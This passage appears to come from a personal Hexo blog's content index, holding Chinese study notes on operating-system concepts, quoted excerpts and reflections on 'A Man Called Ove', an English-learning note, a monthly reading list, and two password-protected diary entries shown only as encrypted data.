</li><li>叙述进程的并发性和制约性。<br>答：进程具有并发性。多个进程实体同存于内存中，在一段时间内可以同时运行。并发性是进程的重要特性，也是操作系统的重要特性。引入进程概念的目的，也正是为了描述和实现并发执行。<br>程序之间的制约关系有两种：直接制约关系和间接制约关系。直接制约关系通常是在彼此之间有逻辑关系的两个并发执行的程序之间发生的，一般是由于各个程序段要求共享信息引起的。间接制约关系是由于两个并发程序段由于竞争使用同一资源引起的，得到资源的程序段可以继续执行，得不到资源的程序段就只好暂停等待，直至获得可用资源时再继续运行。  </li></ol><h3 id="进程的描述"><a href="#进程的描述" class="headerlink" title="进程的描述"></a>进程的描述</h3><h4 id="进程的特征"><a href="#进程的特征" class="headerlink" title="进程的特征"></a>进程的特征</h4><ol><li>动态性  </li><li>并发性  </li><li>独立性  </li><li>异步性  </li><li>结构性  </li></ol><h4 id="进程的状态"><a href="#进程的状态" class="headerlink" title="进程的状态"></a>进程的状态</h4><ol><li>就绪状态  </li><li>执行状态  </li><li>阻塞状态  </li><li>挂起状态  </li></ol><h4 id="进程同步机制应遵循的原则"><a href="#进程同步机制应遵循的原则" class="headerlink" title="进程同步机制应遵循的原则"></a>进程同步机制应遵循的原则</h4><ol><li>空闲让进  </li><li>忙则等待  </li><li>有限等待  </li><li>让权等待  </li></ol><h4 id="信号量的操作"><a href="#信号量的操作" class="headerlink" title="信号量的操作"></a>信号量的操作</h4><ol><li>P操作/wait  <pre><code>S = S - 1  if(S&lt;0)      W(S)  </code></pre></li><li>V操作/signal  <pre><code>S = S + 1  if(S&lt;=0)      R(S)  </code></pre><h4 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h4></li><li>共享存储器系统  </li><li>消息传递系统  </li><li>管道通信系统  </li></ol><h3 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h3><ol><li>高级调度/作业调度<br>决定哪些作业调入主存，创建进程，分配资源  </li><li>低级调度/进程调度<br>决定哪个进程获得处理器，执行  </li><li>中级调度  </li></ol><h4 id="进程调度算法"><a href="#进程调度算法" class="headerlink" title="进程调度算法"></a>进程调度算法</h4><ol><li>先来先服务调度算法  </li><li>短进程优先调度算法  </li><li>时间片轮转调度算法  </li><li>优先数调度算法  </li><li>响应比高者优先调度算法  </li><li>多级队列调度算法  </li></ol><h3 id="进程死锁"><a href="#进程死锁" class="headerlink" title="进程死锁"></a>进程死锁</h3><h4 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h4><ol><li>互斥条件  </li><li>请求和保持条件  </li><li>不剥夺条件  </li><li>环路等待条件  </li></ol><h4 id="死锁预防"><a href="#死锁预防" class="headerlink" title="死锁预防"></a>死锁预防</h4><p>破坏3个必要条件之一  </p><h4 id="死锁避免"><a href="#死锁避免" class="headerlink" title="死锁避免"></a>死锁避免</h4><p><font color="red">银行家算法</font>：测试进程对资源的最大需求量    </p><h4 id="死锁检测"><a href="#死锁检测" class="headerlink" title="死锁检测"></a>死锁检测</h4><ol><li>资源分配图  </li></ol><h4 id="死锁解除"><a href="#死锁解除" class="headerlink" title="死锁解除"></a>死锁解除</h4><ol><li>抢占资源法  </li><li>终止进程法  </li></ol><h3 id="常见习题"><a href="#常见习题" class="headerlink" title="常见习题"></a>常见习题</h3><ol><li>判断是否存在死锁  </li></ol><h2 id="存储管理"><a href="#存储管理" class="headerlink" title="存储管理"></a>存储管理</h2><p>第四章 存储器管理<br>第五章 虚拟存储器  </p><h3 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>物理地址和逻辑地址<br>内存是由若干个存储单元组成的，每个存储单元都有个编号，这个编号可以唯一标识一个存储单元，成为内存地址（物理地址）<br>生成的目标程序占据的一定的地址空间，称为逻辑地址空间。在逻辑空间中，每条指令的地址和指令要访问的操作数地址统称为逻辑地址。  </li><li>请求页式和请求段式存储管理的区别  <ul><li><strong>分页</strong>的作业地址空间是<strong>一维</strong>的，即单一的线性地址空间，只需给出一个地址就行。<br><strong>分段</strong>的作业地址空间是<strong>二维</strong>的，既需给出段名，又需给出段内地址。  </li><li>页的大小是<strong>固定</strong>的，用户不可见。<br>段的大小是<strong>不固定</strong>的，是信息的逻辑单位，用户可见。  </li><li>分成页号和页内偏移量是硬件完成的功能<br>分成段号和段内偏移量是软件完成的功能   </li></ul></li><li>联想存储器/快表  </li><li>抖动现象：处理机的大部分时间消耗在频繁的页面置换上，使系统的性能急剧下降。  </li><li>一个计算机系统的虚拟存储器的最大容量是由（<strong>计算机的地址结构</strong>）确定的。<br><em>最大容量取决于地址结构，实际容量取决于系统中内外存容量之和。</em>  </li><li>可变分区存储管理采用的地址变换公式是：物理地址 = 重定位寄存器值 + 相对地址  </li><li>在设备管理中，为了克服独占设备速度较慢、降低设备资源利用率的缺点，引入了虚拟设备，即用共享设备模拟独占设备。  </li><li>常用的内存管理方法有分区管理;页式管理;段式管理;段页式管理。  </li><li>动态存储分配时，要靠硬件地址变换机构实现重定位  </li><li>在存储管理中常用虚拟存储器方式来摆脱主存容量的限制。  </li><li>置换算法是在内存中没有<strong>空闲页面</strong>时被调用的,它的目的是选出一个被<strong>淘汰</strong>的页面。如果内存中有足够的<strong>空闲页面</strong>存放所调入的页,则不必使用<strong>置换算法</strong>。  </li><li>采用动态重定位技术的系统，目标程序可以不经任何改动，而装入物理内存。  </li><li>在虚拟存储方式下，程序员编制程序时不必考虑主存的容量，但系统的吞吐量在很大程度上依赖于主存储器的容量。  </li><li>虚拟存储技术是补充相对地址空间的技术  </li></ol><h3 id="存储管理方式"><a href="#存储管理方式" class="headerlink" title="存储管理方式"></a>存储管理方式</h3><h4 id="全部装入"><a href="#全部装入" class="headerlink" title="全部装入"></a>全部装入</h4><ol><li>单一连续分配  </li><li>固定分区分配  <ul><li>固定分区式管理是支持<strong>多道</strong>程序系统的一种存储管理方式。  </li></ul></li><li>动态分区分配  <ul><li>可重定位分区管理可以对作业分配<strong>连续</strong>的内存单元；  </li></ul></li><li>分页式  <ul><li>在页式管理中,页表的作用是实现从页号到物理块号的地址映射,存储页表的作用是记录内存页面的分配情况。  </li><li>在页式管理中，页式虚地址与内存物理地址的映射是由（页表）和（硬件地址变换机构）完成的。  </li></ul></li><li>分段式  <ul><li>段式管理中以段为单位分配内存,每段分配一个连续的内存区。由于各段长度不等。所以这些存储区的大小不一。而且,同一进程所包含的各段之间不要求连续。  </li></ul></li><li>段页式  <ul><li>在段页式存储管理系统中，面向用户的地址空间是段式划分，面向物理存储的地址空间是页式划分。  </li></ul></li></ol><h4 id="部分装入"><a href="#部分装入" class="headerlink" title="部分装入"></a>部分装入</h4><ol><li>请求分页式虚拟存储管理方式  <ul><li>在请求页式管理中,当硬件变换机构发现所需的页不在内存时,产生缺页中断信号,中断处理程序作相应的处理  </li></ul></li><li>请求分段式虚拟存储管理方式  </li></ol><h3 id="分配算法"><a href="#分配算法" class="headerlink" title="分配算法"></a>分配算法</h3><p>应用于可变分区存储管理  </p><ol><li>首次适应分配算法<br><strong>按地址从小到大排序</strong>  </li><li>循环首次适应算法<br><strong>按地址从小到大排序</strong>  </li><li>最佳适应分配算法<br><strong>按空间大小从小到大排序</strong>  </li><li>最坏适应分配算法<br><strong>按空间大小从大到小排序</strong>  </li><li>快速适应算法  </li><li>伙伴系统  </li><li>哈希算法  </li></ol><h3 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h3><ol><li>最佳置换算法（OPT）<br><font color="grey">选择永不再用或很长时间不再访问的页面换出</font>  </li><li>先进先出置换算法（FIFO）  </li><li>最近最久未用算法（LRU）  </li><li>Clock置换算法  </li><li>最少使用置换算法（LFU）  </li><li>页面缓冲算法  </li></ol><h3 id="常见习题-1"><a href="#常见习题-1" class="headerlink" title="常见习题"></a>常见习题</h3><ol><li>根据逻辑地址计算物理地址<br><font color="navy">页号=[逻辑地址/页长]<br>页内地址=逻辑地址 mod 页长<br>物理地址=块号*块长+块内地址+基址    </font>  </li><li>计算页面置换时的缺页中断次数和缺页率  </li><li>分配作业算法执行时的顺序  </li><li>计算多级页表的数量  </li></ol><h2 id="设备管理"><a href="#设备管理" class="headerlink" title="设备管理"></a>设备管理</h2><p>第六章 输入输出系统  </p><h3 id="基本概念-3"><a href="#基本概念-3" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>共享设备必须是可寻址的和随机访问的设备<br>共享设备是指在<del>同一时刻</del>一段时间，允许多个进程同时访问的设备  </li><li>任务：完成用户提出的I/O请求，分配I/O设备，提高CPU的利用率  </li><li>虚拟设备是通过虚拟技术把物理设备变成能为若干用户使用的逻辑的设备  </li><li>通道是一个独立于CPU的专管输入/输出操作的处理机，它控制设备与内存之间的信息交换。  </li></ol><h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《一个叫欧维的男人决定去死》 弗雷德里克·巴克曼</title>
      <link href="/2020/reading-note/%E3%80%8A%E4%B8%80%E4%B8%AA%E5%8F%AB%E6%AC%A7%E7%BB%B4%E7%9A%84%E7%94%B7%E4%BA%BA%E5%86%B3%E5%AE%9A%E5%8E%BB%E6%AD%BB%E3%80%8B%20%E5%BC%97%E9%9B%B7%E5%BE%B7%E9%87%8C%E5%85%8B%C2%B7%E5%B7%B4%E5%85%8B%E6%9B%BC/"/>
      <url>/2020/reading-note/%E3%80%8A%E4%B8%80%E4%B8%AA%E5%8F%AB%E6%AC%A7%E7%BB%B4%E7%9A%84%E7%94%B7%E4%BA%BA%E5%86%B3%E5%AE%9A%E5%8E%BB%E6%AD%BB%E3%80%8B%20%E5%BC%97%E9%9B%B7%E5%BE%B7%E9%87%8C%E5%85%8B%C2%B7%E5%B7%B4%E5%85%8B%E6%9B%BC/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E4%B8%80%E4%B8%AA%E5%8F%AB%E6%AC%A7%E7%BB%B4%E7%9A%84%E7%94%B7%E4%BA%BA%E5%86%B3%E5%AE%9A%E5%8E%BB%E6%AD%BB%E3%80%8B.jpg" alt="封面" loading="lazy"></p><a id="more"></a>  <h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><h3 id="3-一个叫欧维的男人拉着拖斗倒车"><a href="#3-一个叫欧维的男人拉着拖斗倒车" class="headerlink" title="3 一个叫欧维的男人拉着拖斗倒车"></a>3 一个叫欧维的男人拉着拖斗倒车</h3><ol><li>他怎么也得有两米高。欧维总是本能地对所有一米八五以上的人心存怀疑。经验告诉他，长成这样，血液很难抵达大脑。  </li></ol><h3 id="5-一个叫欧维的男人"><a href="#5-一个叫欧维的男人" class="headerlink" title="5 一个叫欧维的男人"></a>5 一个叫欧维的男人</h3><ol><li>她是色彩，他的全部色彩。  </li><li>晚上他们吃香肠加土豆，然后打牌。拥有的不多，但也从来不少。  </li><li>人们总说欧维眼里的世界非黑即白，而她是色彩，他的全部色彩。  </li></ol><h3 id="7-一个叫欧维的男人挂上个钩子"><a href="#7-一个叫欧维的男人挂上个钩子" class="headerlink" title="7 一个叫欧维的男人挂上个钩子"></a>7 一个叫欧维的男人挂上个钩子</h3><ol><li>失去某人以后总是会有一些奇怪的细节惹人怀念。都是极小的事情。笑容、她睡眠时翻身的样子。为她粉刷房间。  </li><li>如今似乎一切都在背着他慢慢老去。  </li></ol><h3 id="8-一个叫欧维的男人和一对父亲的老脚印"><a href="#8-一个叫欧维的男人和一对父亲的老脚印" class="headerlink" title="8 一个叫欧维的男人和一对父亲的老脚印"></a>8 一个叫欧维的男人和一对父亲的老脚印</h3><ol><li>“每一条道路最终都会带领你到注定的归宿。”  </li></ol><h3 id="9-一个叫欧维的男人给暖气通风"><a href="#9-一个叫欧维的男人给暖气通风" class="headerlink" title="9 一个叫欧维的男人给暖气通风"></a>9 一个叫欧维的男人给暖气通风</h3><ol><li>这是一个还没过期就已经过时的世界。整个国家都在为没人能正经做事起立鼓掌，毫无保留地为平庸欢呼喝彩。  </li></ol><h3 id="10-一个叫欧维的男人造了一幢房子"><a href="#10-一个叫欧维的男人造了一幢房子" class="headerlink" title="10 一个叫欧维的男人造了一幢房子"></a>10 一个叫欧维的男人造了一幢房子</h3><ol><li>他发现自己很喜欢房子。可能主要是因为房子是可以理喻的，可以计算并在纸上画出来。不好好做防水就会漏，不好好做结构就会塌。房子是公平的，你付出多少，它就给你多少。很不幸的是，这些话很难用在人类身上。  </li></ol><h3 id="11-一个叫欧维的男人和那个不从梯子上掉下来就开不了窗的盲流"><a href="#11-一个叫欧维的男人和那个不从梯子上掉下来就开不了窗的盲流" class="headerlink" title="11 一个叫欧维的男人和那个不从梯子上掉下来就开不了窗的盲流"></a>11 一个叫欧维的男人和那个不从梯子上掉下来就开不了窗的盲流</h3><ol><li>生活不应该是现在这个样子，这就是他现在所有的感受。努力工作，自食其力，节衣缩食，买了第一辆萨博；接受教育，通过考试，应聘面试，拿到体面的工作，感恩，从不生病，按时缴税；洁身自好；邂逅一个女人，结婚；努力工作，升职；买一辆新型号的萨博；去银行，贷一笔还款年限为五年的款，买座太太觉得适合养育下一代的排屋；分期还款；节衣缩食；买新萨博；去饭店里播放外国音乐的地方度假，喝太太认为别具异国风味的红酒；然后回家继续工作，承担责任，自食其力，洁身自好。  </li><li>生活不应该是现在这个样子。努力工作，还贷纳税，自食其力，然后结婚，同甘共苦，至死不渝，当初难道不是这样说好的吗？欧维清楚地记得当时立下的誓言。她根本不应该先死，不是明明说好了，先死的是他吗？难道不是这样吗？  </li><li>但欧维很清楚地知道，要是他有生之年干的最后一件事是把一孕妇砸一脸鼻血之后，还让她赶公车，他太太将会怎样唠叨个没完。  </li></ol><h3 id="12-一个叫欧维的男人有所获"><a href="#12-一个叫欧维的男人有所获" class="headerlink" title="12 一个叫欧维的男人有所获"></a>12 一个叫欧维的男人有所获</h3><ol><li>他手插口袋疾步人生。她总是在舞蹈。  </li><li>每个人的生命中总有那么一刻决定他们将成为什么样的人。要是你不了解那个故事，就不了解那个人。  </li></ol><h3 id="13-一个叫欧维的男人和一个叫波波的小丑"><a href="#13-一个叫欧维的男人和一个叫波波的小丑" class="headerlink" title="13 一个叫欧维的男人和一个叫波波的小丑"></a>13 一个叫欧维的男人和一个叫波波的小丑</h3><ol><li>去医院就是找死的，欧维知道。其实欧维觉得，活人干个什么国家都要收费这事儿就够受了。如今人就快死了，还得付停车费，欧维觉得这实在太过分了。他就是这么跟停车场管理员解释的。  </li><li>他困惑地瞪着这个满嘴语法错误的小自然灾害，她满脸堆笑地回应。  </li></ol><h3 id="14-一个叫欧维的男人和一个火车上的女人"><a href="#14-一个叫欧维的男人和一个火车上的女人" class="headerlink" title="14 一个叫欧维的男人和一个火车上的女人"></a>14 一个叫欧维的男人和一个火车上的女人</h3><ol><li>如今，她穿着这件鲜红的羊毛衫站在火车站外，快乐地把他的花捧在胸口，让周围的世界都失了色。<br>“它们真美。”她真诚的笑声让欧维忍不住低下头去踹一脚砾石。  </li><li>要是有人问起，他会说，在她之前，他没有生活。之后也没有。  </li></ol><h3 id="15-一个叫欧维的男人和一列晚点的火车"><a href="#15-一个叫欧维的男人和一列晚点的火车" class="headerlink" title="15 一个叫欧维的男人和一列晚点的火车"></a>15 一个叫欧维的男人和一列晚点的火车</h3><ol><li>心脏猛烈地怦怦作响，就像他的胸腔是世上最后一座还能用的公厕门。  </li></ol><h3 id="16-一个叫欧维的男人和一辆树林里的卡车"><a href="#16-一个叫欧维的男人和一辆树林里的卡车" class="headerlink" title="16 一个叫欧维的男人和一辆树林里的卡车"></a>16 一个叫欧维的男人和一辆树林里的卡车</h3><ol><li>有人说最优秀的人是从错误中重生的，他们后来通常比那些从没有犯过错误的人更优秀。  </li></ol><h3 id="18-一个叫欧维的男人和一只叫恩斯特的猫"><a href="#18-一个叫欧维的男人和一只叫恩斯特的猫" class="headerlink" title="18 一个叫欧维的男人和一只叫恩斯特的猫"></a>18 一个叫欧维的男人和一只叫恩斯特的猫</h3><ol><li>“现在你得加倍爱我。”她要求道。<br>于是欧维对她撒了谎，说他会的。尽管他心里很清楚，他已经不可能比现在更爱她了。  </li></ol><h3 id="19-一个叫欧维的男人和一只本来就不成样子的猫"><a href="#19-一个叫欧维的男人和一只本来就不成样子的猫" class="headerlink" title="19 一个叫欧维的男人和一只本来就不成样子的猫"></a>19 一个叫欧维的男人和一只本来就不成样子的猫</h3><ol><li>“我想你。”他喃喃地说，眼眶中飞快地闪过一丝光芒。他感到手臂触碰到了什么柔软的东西。过了好一会儿，他才明白，是猫咪小心翼翼地把头埋在了他的掌心里。  </li></ol><h3 id="20-一个叫欧维的男人和一个入侵者"><a href="#20-一个叫欧维的男人和一个入侵者" class="headerlink" title="20 一个叫欧维的男人和一个入侵者"></a>20 一个叫欧维的男人和一个入侵者</h3><ol><li>欧维也不是害怕，而是他不知道该如何为成为爸爸作准备。他曾问有没有这方面的说明书，但只是换来了索雅的嘲笑。欧维不明白为什么。什么东西不都有个说明书吗。  </li><li>欧维瘫坐在门厅里的凳子上，因屈辱而颤抖着。他几乎忘了这种感觉。屈辱、无助，无法与穿白衬衫的男人对峙。  </li></ol><h3 id="21-一个叫欧维的男人和那些饭馆里播放异国音乐的国家"><a href="#21-一个叫欧维的男人和那些饭馆里播放异国音乐的国家" class="headerlink" title="21 一个叫欧维的男人和那些饭馆里播放异国音乐的国家"></a>21 一个叫欧维的男人和那些饭馆里播放异国音乐的国家</h3><ol><li>“欧维，当一个人给另一个人钱，蒙福的不是那个收钱的人，而是给钱的那个。”  </li><li>这是欧维一生中最幸福的一周。命中注定，最糟糕的厄运紧随其后。  </li></ol><h3 id="23-一个叫欧维的男人和一辆一去不返的公车"><a href="#23-一个叫欧维的男人和一辆一去不返的公车" class="headerlink" title="23 一个叫欧维的男人和一辆一去不返的公车"></a>23 一个叫欧维的男人和一辆一去不返的公车</h3><ol><li>每个人都必须知道他在为什么奋斗，他们这么说。她为了一切的美好而奋斗，为了她从未降生的孩子，而欧维为了她而奋斗。  </li></ol><h3 id="25-一个叫欧维的男人和一块波形铁皮"><a href="#25-一个叫欧维的男人和一块波形铁皮" class="headerlink" title="25 一个叫欧维的男人和一块波形铁皮"></a>25 一个叫欧维的男人和一块波形铁皮</h3><ol><li>她就像她们那代女人一样，每天早晨在门廊中倔强地用一把笤帚扫尽屋里的忧伤。  </li></ol><h3 id="26-一个叫欧维的男人和一个再也没人会修自行车的社会"><a href="#26-一个叫欧维的男人和一个再也没人会修自行车的社会" class="headerlink" title="26 一个叫欧维的男人和一个再也没人会修自行车的社会"></a>26 一个叫欧维的男人和一个再也没人会修自行车的社会</h3><ol><li>“你是什么样我照单全收。”她总是这么说，说到做到。  </li><li>他沉默起来。然后，两个男人，一个五十九岁，一个十几岁，隔着几米的距离，各自踹着积雪，就像互相踹着一段记忆，关于一个女人的记忆，她总是坚信某些人身上存在着连他们自己都发觉不了的潜质。两人都不知道该拿这段共同的经历如何是好。  </li></ol><h3 id="28-一个叫欧维的男人和一个叫鲁尼的男人"><a href="#28-一个叫欧维的男人和一个叫鲁尼的男人" class="headerlink" title="28 一个叫欧维的男人和一个叫鲁尼的男人"></a>28 一个叫欧维的男人和一个叫鲁尼的男人</h3><ol><li>但这种形式的悲伤是不可靠的，如果两个人不分担这份悲伤，就会被这悲伤分开。  </li></ol><h3 id="29-一个叫欧维的男人和一个同性恋者"><a href="#29-一个叫欧维的男人和一个同性恋者" class="headerlink" title="29 一个叫欧维的男人和一个同性恋者"></a>29 一个叫欧维的男人和一个同性恋者</h3><ol><li>帕尔瓦娜很快发现欧维就是那种人——即使不知道往哪儿走，也会坚定不移地走下去，并且相信道路迟早会迎合他。现在，当他们发现咖啡馆就在车对面的时候，欧维自然又摆出一副一切都是按他计划的样子。帕尔瓦娜擦掉挂在脸颊的汗珠。  </li></ol><h3 id="31-一个叫欧维的男人挂着拖斗倒车。又来了。"><a href="#31-一个叫欧维的男人挂着拖斗倒车。又来了。" class="headerlink" title="31 一个叫欧维的男人挂着拖斗倒车。又来了。"></a>31 一个叫欧维的男人挂着拖斗倒车。又来了。</h3><ol><li>他们都拥有同样空洞的眼神，就好像他们只是一些到处破坏别人生活的行尸走肉。  </li><li>胸口的压力就像一片巨大的阴影穿着皮靴踩在他的喉头，二十分钟后才松开。  </li></ol><h3 id="32-一个叫欧维的男人不开该死的旅馆"><a href="#32-一个叫欧维的男人不开该死的旅馆" class="headerlink" title="32 一个叫欧维的男人不开该死的旅馆"></a>32 一个叫欧维的男人不开该死的旅馆</h3><ol><li>“每个人都想有尊严地生活。对不同的人来说，尊严是不同的。”索雅曾说。对欧维和鲁尼这样的男人来说，尊严只是成年以后可以自力更生，把不需要依靠别人视为自己的权利。掌控中存在一种自豪感，明辨是非的自豪感，知道该走哪条路，知道该不该在哪儿拧上螺丝。欧维和鲁尼这样的人还留在靠行动而不是靠嘴说的年代，索雅总是那么说。  </li></ol><h3 id="33-一个叫欧维的男人和一次非比寻常的巡逻"><a href="#33-一个叫欧维的男人和一次非比寻常的巡逻" class="headerlink" title="33 一个叫欧维的男人和一次非比寻常的巡逻"></a>33 一个叫欧维的男人和一次非比寻常的巡逻</h3><ol><li>有时候，人们那些突如其来的行为是很难理解的。有时候，当然，他们会想，反正早晚都要这么做，那么择日不如撞日，就趁现在了。有时候却恰恰相反，人们突然意识到，有些事早就该做了。欧维大概从来就知道自己到底该做什么，但对于时间，所有人都太乐观。我们相信总能腾出时间来与他人一起做想做的事，说想说的话。然后突然有一天，发生了什么意外，我们就只好站在那儿，脑海总盘旋着一个词：如果。  </li><li>人们那些突如其来的行为有时候是很难理解的。欧维大概从来就知道自己到底该做什么，死之前还需要去帮助什么人。但对于时间，所有人都太乐观。我们相信总能腾出时间来，与他人一起做想做的事，说想说的话。  </li></ol><h3 id="35-一个叫欧维的男人和社交障碍"><a href="#35-一个叫欧维的男人和社交障碍" class="headerlink" title="35 一个叫欧维的男人和社交障碍"></a>35 一个叫欧维的男人和社交障碍</h3><ol><li>“遇到困难就退让，算什么爱？有所求就抛弃，告诉我，这算什么爱？”  </li></ol><h3 id="36-一个叫欧维的男人和一杯威士忌"><a href="#36-一个叫欧维的男人和一杯威士忌" class="headerlink" title="36 一个叫欧维的男人和一杯威士忌"></a>36 一个叫欧维的男人和一杯威士忌</h3><ol><li>“爱上一个人就像搬进一座房子，”索雅曾说，“一开始你会爱上新的一切，陶醉于拥有它的每一个清晨，就好像害怕会有人突然冲进房门指出这是个错误，你根本不该住得那么好。但经年累月房子的外墙开始陈旧，木板七翘八裂，你会因为它本该完美的不完美而渐渐不再那么爱它。然后你渐渐谙熟所有的破绽和瑕疵。天冷的时候，如何避免钥匙卡在锁孔里；哪块地板踩上去的时候容易弯曲；怎么打开一扇橱门又恰好可以不让它嘎吱作响。这些都是会赋予你归属感的小秘密。”  </li></ol><h3 id="39-一个叫欧维的男人和死神"><a href="#39-一个叫欧维的男人和死神" class="headerlink" title="39 一个叫欧维的男人和死神"></a>39 一个叫欧维的男人和死神</h3><ol><li>死亡是一桩奇怪的事情。人们终其一生都在假装它并不存在，尽管这是生命的最大动机之一。我们其中一些人有足够时间认识死亡，他们得以活得更努力、更执着、更壮烈。有些人却要等到它真正逼近时才意识到它的反义词有多美好。另一些人深受其困扰，在它宣布到来之前就早早地坐进等候室。我们害怕它，但我们更害怕它发生在身边的人身上。对死亡最大的恐惧，在于它与我们擦肩而过，留下我们独自一人。  </li></ol><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>欧维真的很喜欢自己的妻子，不管干什么，都是在想“如果是她，会怎么做”。每次发生一些事，都会想“这是他再次见到太太以后要告诉她的事”<br>很喜欢一句话  </p><blockquote><p>他手插口袋疾步人生，而她总在舞蹈。  </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-5-2</title>
      <link href="/2020/diary/2020-5/2020-5-2/"/>
      <url>/2020/diary/2020-5/2020-5-2/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="3d9be9dea19fb03594bce70f9ef1eb147a0c153079f6a7e3418e4cf38bf7c9e2">e32c27e47419b87d293b9e8ce412adf8d74b2f2577633cdca9b3c5a044e77a82096d626010c8f4c13fb7f41ace3790308ac5d62a0940504db81f63b77aa15cf61d5e703ffbbfc5a753634984ea5c0abc8c63558ec57f9f6318b8744c87598bda1e87bf21de0dd95ded3aed9486e56af0c340d1d14dcc8b547e32bfb04c058e0d47602a38143d0d65e04c9afbdc89030f37376f7b0e4308e70d9dc37f9b5e6bce5d36ec4902fdff2c3ca90a214649d17a1929f32d13b5a085b312e57385892c1dfcf4c88d4f2868af0ac53fb1f4d2e022fa72c8eded556d5877d13521f9f7066abfc8a4b516a0070e05c2156214573b1cac2cf1d16c60e93804c4c81d38ee4b7da6b37b0215e7c9ee5f87e018b48f4c36bd0c306b928bfe527f547f2803732b8faf87bfba7266826c7cc61ed25bf9666c345ab6dbe2e42c0545cb4eb3b93ea577bf4b5bccaf6754e5cc6186f944de6ebe8e404074a1c0bed5e64a27aac34644519913e44ea868730b271d4e7994d4305c586c626b98606e64399614c63f2ef3962b1b0153b12fb1c35a50b54a9f7745c2ef2098972c0e25403ef73b82b9c503f12313f4fffe61ea4fabd97251f9f3d51431be4f884b5187dedd3c6aa28a25a2841e17e6382d0a307604028c8f009831f4c6f177c876c26a10d29ea7deea5ff058fa2fa3b6e9b9048a5adde6e2ffe87805acf4bbfdf6d9d1811451aef32cb0f4567e503a2c4273530c6626d11761d243d432d89bf434d03a471713d14af53367a6cbf382288e6551fe65fe57d0829c61cc</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
            <tag> vc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Learning-English</title>
      <link href="/2020/learning/Learning-English/"/>
      <url>/2020/learning/Learning-English/</url>
      
        <content type="html"><![CDATA[<p>今天早上看了一些关于学习英语的视频，在此记录一下自己提取出来的精髓。  </p><a id="more"></a>  <h2 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h2><p>首先最重要的一点是，选择一个适合自己的阅读材料，比如一些报刊、杂志之类的。<br>接下来说一下阅读方法  </p><ol><li>通读文章（此时不查单词）  </li><li>精读文章（查阅单词、分析长难句）  </li><li>复读文章（重新代入上下文，进行知识点的记忆）  </li><li>速读文章（掌握阅读的连贯性和文章的中心）  </li></ol><h2 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h2><p>写作是综合能力的体现，因此要想提高写作水平，就得多学多练。  </p><ol><li>语法知识  </li><li>大量阅读材料（论据）  </li><li>批判性思维  </li><li>多练  </li></ol><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>语法书推荐<br>English Grammar in use<br>Advanced Grammar in use  </p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4月小结</title>
      <link href="/2020/reading-note/4%E6%9C%88%E5%B0%8F%E7%BB%93/"/>
      <url>/2020/reading-note/4%E6%9C%88%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="总记"><a href="#总记" class="headerlink" title="总记"></a>总记</h2><p>这个月一样没有看电影，emmm，下次一定。</p><h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><ol><li>我们仨</li><li>许三观卖血记</li><li>山茶文具店</li><li>如何成为一个有趣的人</li><li>世界尽头的咖啡馆<br>共5本书</li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-5-1</title>
      <link href="/2020/diary/2020-5/2020-5-1/"/>
      <url>/2020/diary/2020-5/2020-5-1/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="497e8bb8493424d0acc801c82764a3cbdf3658ced59275f0dc0b0ffa2e93307a">e32c27e47419b87d293b9e8ce412adf8d74b2f2577633cdca9b3c5a044e77a82096d626010c8f4c13fb7f41ace3790308ac5d62a0940504db81f63b77aa15cf61d5e703ffbbfc5a753634984ea5c0abc8c63558ec57f9f6318b8744c87598bda13331f87c63444363ac4e69e33fe048e9f158411f624b5ad00c21d38a8aa0023e3042130f95830206c317ca61ae8eeb70ed9c0a586176bdde2021aaa63950b066ea10d236da063394b0b415b1eac472f8cf684679583e24f58938273ffbe8969e6f746457eced19b6a351bde19b66efc0473f59f1bef27239ac6d29e3afcef769902e2f2c95b88f57909f44337df6a33f5a4cdbc27e1404168c1dc4f04c530571c2c6ec13e3c205ca4bcd3728ae7aca09d018e2e26df5fd12d07e0b27b39de9e504e2136be6f8972476f998c